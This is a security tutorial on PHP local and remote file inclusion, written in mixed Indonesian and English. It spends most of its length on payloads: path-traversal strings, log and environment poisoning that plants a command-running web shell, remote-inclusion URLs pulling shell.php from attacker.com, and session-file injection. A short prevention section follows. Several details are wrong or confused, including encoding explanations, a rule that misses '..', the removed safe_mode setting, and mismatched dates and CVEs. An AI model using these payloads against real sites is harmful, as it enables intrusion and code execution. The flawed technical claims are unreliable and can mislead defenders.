# File Inclusion - Directory Traversal & Remote Code Execution

## 🎯 Apa Itu File Inclusion?

**File Inclusion** adalah vulnerability dimana attacker dapat include (sertakan) files arbitrary dari server filesystem atau remote locations ke dalam web application response. Vulnerability ini memanfaatkan insecure direct object references atau dynamic file inclusion.

### Lokal File Inclusion (LFI)
- Include local server files
- Read sensitive files: `/etc/passwd`, config files
- Potential untuk **Remote Code Execution (RCE)**

### Remote File Inclusion (RFI)
- Include files dari remote servers
- Execute remote code jika allow_url_include enabled
- Require allow_url_include = On (PHP)

## 🔬 Cara Kerja File Inclusion

### LFI Flow
1. Attacker crafts request dengan traversal sequences
2. Server includes file tanpa validation
3. File content dikirim dalam response
4. Attacker extracts sensitive information

### Vulnerable Code Examples

#### PHP LFI (Local)
```php
// Vulnerable include
$page = $_GET['page'];
include($page);

// Safe way
$allowed_pages = ['home.php', 'about.php'];
if (in_array($page, $allowed_pages)) {
    include($page);
}
```

#### PHP RFI (Remote)
```php
// Requires: allow_url_include = On
$template = $_GET['template'];
include($template);  // Can be http://attacker.com/evil.php
```

## 🏗️ Teknologi Di Balik File Inclusion

### PHP Include Functions
- `include()` - Include dan execute jika PHP
- `require()` - Same seperti include tapi fatal error jika gagal
- `include_once()` / `require_once()` - Prevent double inclusion
- `__FILE__` constant - Current file path
- `__DIR__` constant - Current directory

### Path Traversal Techniques

#### Basic Traversal
```bash
# Single dot traversal
../../../../etc/passwd

# Double dot (more common)
../../../etc/passwd

# URL encoded traversal
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Advanced Traversal Sequences
```bash
# Null byte injection (old PHP)
../../../../etc/passwd%00.jpg

# Alternative path separators
.../...//etc/passwd
..;..;etc;passwd

# UNC paths (Windows)
..\..\..\Windows\System32\drivers\etc\hosts
```

## 📊 Tipe Attack

### Local File Disclosure
```bash
# Read system files
?file=../../../../etc/passwd
?page=../../../var/www/html/config.php

# Windows specific
?file=..\..\..\Windows\System32\drivers\etc\hosts
```

### Log Poisoning + LFI
```bash
# Inject PHP code ke access logs
curl -A "<?php phpinfo(); ?>" http://target.com/

# Then LFI to access log
?page=/var/log/apache2/access.log
```

### /proc/self/environ Exploitation
```bash
# /proc/self/environ contains environment variables
?page=/proc/self/environ

# With user agent injection
# Set User-Agent: <?php system($_GET['cmd']); ?>
?page=/proc/self/environ&cmd=id
```

### Remote File Inclusion
```bash
# Basic RFI
?page=http://attacker.com/shell.txt

# With PHP execution
?page=http://attacker.com/shell.php
?template=http://attacker.com/evil.inc
```

### LFI to RCE via Log Files
```bash
# Apache access log
?writable=/var/log/apache2/access.log&cmd=ls

# SSH auth log
?page=/var/log/auth.log
```

## 🛠️ Testing Serangan File Inclusion

### LFI Discovery Steps

#### Step 1: Detect Parameter
```bash
# Common injection points
?page=home
?file=config.php
?lang=en
?template=default
```

#### Step 2: Traversal Testing
```bash
?page=../../../etc/passwd
?page=../../../../etc/passwd
?page=/etc/passwd%00  # Null byte
```

#### Step 3: Filter Evasion
```php
# Path normalization bypass
?page=....//....//etc/passwd

# Filter bypass with double encoding
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Step 4: Known File Inclusion
```bash
# Unix
?page=/etc/passwd
?page=/etc/group
?page=/proc/version
?page=/proc/self/cmdline

# Windows
?page=/Windows/System32/drivers/etc/hosts
?page=/Windows/win.ini
?page=/boot.ini
```

### Burp Suite Testing
1. **Parameter Discovery:** Use Param Miner or manual browsing
2. **Intruder:** Payload position untuk traversal sequences
3. **Repeater:** Manual testing dengan different paths

### RFI Testing
```bash
# Test RFI capability
?page=http://127.0.0.1/file.txt

# Create test remote file
echo "RFI works" > /var/www/html/test.txt
?page=http://target.com/test.txt

# PHP RFI shell
echo "<?php phpinfo(); ?>" > webshell.php
?page=http://attacker.com/webshell.php
```

## 🛡️ Prevention & Mitigation

### Path Sanitization
```php
// Absolute path conversion
$basepath = '/var/www/html/pages/';
$filepath = realpath($basepath . $page);

// Verify path is within allowed directory
if (strpos($filepath, $basepath) !== 0) {
    die("Invalid path");
}
```

### Whitelisting Approach
```php
$allowed_pages = [
    'home.php',
    'about.php',
    'contact.php'
];

$page = $_GET['page'];
if (!in_array($page, $allowed_pages)) {
    $page = 'home.php';  // Default fallback
}
include($page);
```

### Function Replacement
```php
// Safe file operations
require_once()       // Prevent multiple inclusion
fopen() + fread()    // Use file_get_contents alternative

// Instead of include(), use:
$content = file_get_contents($filepath);
echo htmlspecialchars($content);  // Prevent PHP execution
```

### Server Configuration

#### Apache HTAccess
```apache
<Files ~ "\.inc$">
    Order allow,deny
    Deny from all
</Files>

# Prevent directory traversal
RewriteCond %{REQUEST_URI} \.\.\. [NC,OR]
RewriteCond %{REQUEST_URI} \.\.\; [NC]
RewriteRule .* - [F]
```

#### PHP Configuration
```ini
; Disable remote includes
allow_url_include = Off
allow_url_fopen = Off

; Safe mode (deprecated but good practice)
safe_mode = On
open_basedir = /var/www/html/
```

### Web Application Firewall
- **ModSecurity:** File traversal rules
- **Cloudflare:** Path traversal protection
- **AWS WAF:** Byte-range matching untuk traversal sequences

## 🔍 Real-World Examples

### 2019: Symfony Framework LFI
- PHP Symfony vulnerable ke arbitrary file inclusion
- Attacker accessed database configs
- CVE-2018-14730

### 2017: WordPress MailPoet RCE
- LFI bug allowed code execution via wp-mail.php
- Million websites affected
- Fixed with input validation

### 2021: Microsoft IIS Short File Name Disclosure
- Windows feature leaked file names via 8.3 naming
- ~200 chars limit bypassed dengan parent directory repetition

## 📈 Advanced File Inclusion

### Double Encoding Bypass
```bash
# UTF-8 overlong encoding
%2e%c0%af  # Encoded ..
%c0%ae%c0%ae  # encoded /

# Multiple encoding layers
%%32%%65%%32%%65%%2f%%32%%65%%32%%65%%2fetc%%2fpasswd
```

### UTF-8 Bypass
```bash
# Non-standard UTF-8 sequences
%E5%98%8D%E5%98%8Aetc/passwd    # Invalid UTF-8 misinterprets ..
```

### Session File Inclusion
```bash
# Write PHP code to session
<script>document.location='target.com/write_session.php?sess=<?php system(\$_GET[cmd]\); ?>'</script>

# Include session file
?page=/tmp/sess_CUSTOMSESSIONID&cmd=id
```

### Source Code Disclosure
```bash
# Source code viewing via PHP filters
?page=php://filter/convert.base64-encode/resource=index.php

# Zip file extraction
?page=zip:///var/www/html/uploads/evil.zip%23shell.php
```

## 🎯 Testing Framework

### Systematic Testing
1. **Parameter Discovery:** Identifikasi semua file inclusion points
2. **Context Analysis:** PHP vs HTML inclusion
3. **Traversal Testing:** [1-10] dot sequences
4. **Filter Bypass:** Encoding, null bytes, UNC paths
5. **Exploit Development:** From LFI to RCE

### Reporting Structure
```
# Vulnerability: Local File Inclusion
# URL: http://target.com/page.php?file=config.php
# Parameter: file
# Payload: ../../../../etc/passwd
# Disclosure: root:x:0:0:root:/root:/bin/bash
# Impact: Information disclosure, potential RCE
# CVSS: 7.5 (High)
# Fix: Path restriction + allowlist validation
```

---

**File inclusion sering diremehkan tapi berbahaya.** Dari info leak hingga full RCE melalui log poisoning. Prevention: strict path validation + remote include disabled. Master traversal techniques untuk thorough testing. 📁💀
